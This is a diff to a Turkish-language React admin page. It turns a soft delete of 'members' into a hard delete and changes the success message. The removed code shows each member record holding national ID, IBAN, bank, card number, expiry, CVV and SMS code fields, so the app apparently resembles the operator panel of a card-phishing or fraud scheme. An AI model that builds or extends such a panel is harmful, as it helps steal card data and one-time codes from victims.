@@ -78,43 +78,15 @@ export default function AdminPage() {
       setIsFormOpen(true);
     };
 
-    const handleDeleteMember = async (id: string) => {
-        // This is a soft delete. It resets the user's data in our local storage
-        // but does not remove them from Firebase Auth. This is safer.
-        const updatedMembers = members.map(m => {
-            if (m.id === id) {
-                return {
-                    ...m,
-                    name: '',
-                    phoneNumber: '',
-                    iban: '',
-                    bank: '',
-                    tc: '',
-                    il: '',
-                    ilce: '',
-                    weeklyGain: '',
-                    errorMessage: 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
-                    onayMesaji: 'İşleminiz başarıyla alındı.',
-                    invoiceAmount: '',
-                    accountActivity: '',
-                    meetingInfo: '',
-                    currentBalance: '0 TL',
-                    status: 'Pasif',
-                    transactionStatus: 'allowed',
-                    cardNumber: '',
-                    cardExpiry: '',
-                    cardCvv: '',
-                    smsCode: '',
-                };
-            }
-            return m;
-        });
-
-        await saveMembers(updatedMembers);
+    const handleDeleteMember = async (idToDelete: string) => {
+        const updatedMembers = members.filter(member => member.id !== idToDelete);
+        
+        saveMembers(updatedMembers);
         setMembers(updatedMembers);
+        
         toast({
             title: "Başarılı",
-            description: "Üyenin profil bilgileri sıfırlandı. Firebase Auth kaydı silinmedi.",
+            description: "Üye başarıyla silindi. Firebase Auth kaydı etkilenmedi.",
         });
     };
 
